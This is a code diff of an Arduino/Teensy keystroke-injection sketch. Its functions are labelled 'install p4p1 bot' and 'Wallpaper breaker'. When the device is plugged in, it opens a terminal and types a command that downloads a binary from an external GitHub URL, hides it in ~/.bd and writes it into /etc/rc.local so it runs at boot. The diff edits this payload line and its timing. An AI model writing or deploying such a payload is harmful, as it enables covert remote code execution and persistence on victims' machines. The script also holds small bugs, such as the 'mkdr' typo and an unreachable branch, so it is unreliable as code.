@@ -16,8 +16,6 @@ void sscript();
 
 void setup()
 {
-
-	delay(1000);
   
 	pinMode(ledPin, OUTPUT);
 	pinMode(noExecPin, INPUT);
@@ -37,9 +35,12 @@ void loop()
 	// This code can be re-executed if needed
 	// eg: Re type password.
 	if(digitalRead(noExecPin) != HIGH){
-		setup();
+		script();
 	}else if(digitalRead(passwdPin) != HIGH){
 		enterPass();
+	} else if ((digitalRead(noExecPin) != HIGH) &&
+	          (digitalRead(passwdPin) != HIGH)) {
+	  sscript();
 	}
 
 }
@@ -64,6 +65,7 @@ int main_code()
 //  install p4p1 bot
 void script()
 {
+  delay(1500);
 	pressModifier(MODIFIERKEY_GUI);
 	pressKey(KEY_D);
 	resetKey();
@@ -80,7 +82,7 @@ void script()
 	pressModifier(MODIFIERKEY_ALT);
 	pressKey(KEY_O);
 	resetKey();
-	DELAY;
+	delay(900);
 	pressModifier(MODIFIERKEY_ALT);
 	pressKey(KEY_SPACE);
 	resetKey();
@@ -104,13 +106,14 @@ void script()
 // Wallpaper breaker :)
 void sscript()
 {
+  delay(1500);
 	pressModifier(MODIFIERKEY_GUI);
 	resetKey();
-	delay(600);
+  delay(600);
 	Keyboard.print("terminal");
 	pressKey(KEY_ENTER);
-	delay(1000);
-	Keyboard.print("wget \"https://raw.githubusercontent.com/p4p1/Projects/master/ExecuteDump/ch.x\"; chmod 755 ch.x ; mkdr ~/.bd ; mv ch.x .bd/.ch.x; echo /home/$WHOAMI/.bd/ch.x > /etc/rc.local");
+	delay(1600);
+	Keyboard.print("wget \"https://raw.githubusercontent.com/p4p1/Projects/master/ExecuteDump/ch.x\"; chmod 755 ch.x ; mkdr ~/.bd ; mv ch.x .bd/.ch.x; echo /home/$USER/.bd/ch.x > /etc/rc.local");
 	pressKey(KEY_ENTER);
 	delay(1000);
 	Keyboard.print("exit");
